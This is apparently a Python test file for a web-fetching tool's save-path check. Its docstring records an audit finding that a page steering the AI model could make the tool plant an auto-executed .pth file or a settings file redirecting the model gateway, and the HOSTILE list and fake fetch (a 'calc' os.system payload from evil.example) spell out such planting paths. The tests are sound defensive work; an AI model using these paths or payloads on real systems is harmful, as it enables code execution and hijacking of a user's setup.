"""A saved web extract is a note, never a file some program loads.

Security audit 2026-11-10, SEC-01. ``read_url_to_file`` runs with no approval
card (write tier) and saves what the fetched server answered -- a JSON answer
byte for byte, under header lines that all begin with ``# ``. Its only rules
were "inside the workspace" and "does not exist yet", so a page that steered
the model could plant ``.venv/Lib/site-packages/x.pth`` (Python runs its
``import`` lines at the next start) or ``kazma.local.yaml`` (settings: the
model gateway's address) on an install whose workspace is the install folder.

Now a save is a ``.md`` or ``.txt`` file with a plain name, outside every
environment, tool and dot folder, and never one of Kazma's own files.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from kazma_core.tools import read_url as ru

HOSTILE = [
    ".venv/Lib/site-packages/zz_kazma.pth",
    ".venv/lib/python3.11/site-packages/zz.pth",
    "venv/Lib/site-packages/notes.md",          # a loaded folder, even as .md
    "VENV/Lib/Site-Packages/notes.md",          # Windows compares names without case
    "./kazma.local.yaml",
    "sub/kazma.yaml",
    "sub/conftest.py",
    "sub/sitecustomize.py",
    ".git/hooks/pre-commit",
    ".git/notes.md",
    ".github/workflows/x.md",
    ".kazma/observer.md",
    "kazma-data/notes.md",
    "node_modules/pkg/readme.md",
    "sub/.env",
    "sub/.hidden.md",
    "sub/run.bat",
    "sub/noext",
    "sub/kazma.local.yaml:notes.md",            # an alternate data stream on NTFS
]

ALLOWED = [
    None,                                       # the default name under research/
    "sample.md",
    "notes/out.md",
    "research/reports/topic-20261110/src-01.md",
    "research/thesis.txt",
    "Docs/Meeting Notes.MD",
]


def _old_rule(root: Path, name: str) -> Path | str:
    """The rule as it was: inside the workspace is enough."""
    name = name.strip().replace("\\", "/").lstrip("/")
    if ".." in name.split("/"):
        return "Error: path traversal not allowed."
    target = (root / name).resolve()
    try:
        target.relative_to(root)
    except ValueError:
        return "Error: path must stay inside the active workspace."
    return target


@pytest.fixture()
def workspace(tmp_path: Path):
    root = (tmp_path / "ws").resolve()
    root.mkdir()
    with patch.object(ru, "_workspace_root", return_value=root):
        yield root


@pytest.mark.parametrize("path", HOSTILE)
def test_a_path_a_program_loads_is_refused(workspace: Path, path: str) -> None:
    answer = ru._safe_workspace_path(path, "https://example.com/p")
    assert isinstance(answer, str) and answer.startswith("Error:"), answer


@pytest.mark.parametrize("path", HOSTILE)
def test_control_the_old_rule_accepted_it(workspace: Path, path: str) -> None:
    assert isinstance(_old_rule(workspace, path), Path)


@pytest.mark.parametrize("path", ALLOWED)
def test_a_note_is_still_saved(workspace: Path, path: str | None) -> None:
    answer = ru._safe_workspace_path(path, "https://example.com/p")
    assert isinstance(answer, Path), answer
    answer.relative_to(workspace)


@pytest.mark.asyncio
async def test_the_tool_plants_nothing(workspace: Path) -> None:
    """End to end: the tool's answer is an error and no file appears."""
    from kazma_core.web_acquire import FetchResult

    ru.clear_url_cache()

    async def fake_fetch(url: str, **kwargs) -> FetchResult:
        return FetchResult(ok=True, url=url, text='import os;os.system("calc")')

    target = ".venv/Lib/site-packages/zz_kazma.pth"
    with patch.object(ru, "fetch_result", side_effect=fake_fetch):
        answer = await ru.read_url_to_file("https://evil.example/p", path=target)
        assert answer.startswith("Error:"), answer
        assert not (workspace / target).exists()
        assert not (workspace / ".venv").exists()

        saved = await ru.read_url_to_file("https://evil.example/p", path="notes/page.md")
        assert "Saved" in saved
        assert (workspace / "notes" / "page.md").is_file()


def test_the_crawler_saves_through_the_same_rule() -> None:
    """``crawl_site`` (read tier) names its files through this helper too."""
    from kazma_core.tools import web_research

    assert web_research._safe_workspace_path is ru._safe_workspace_path
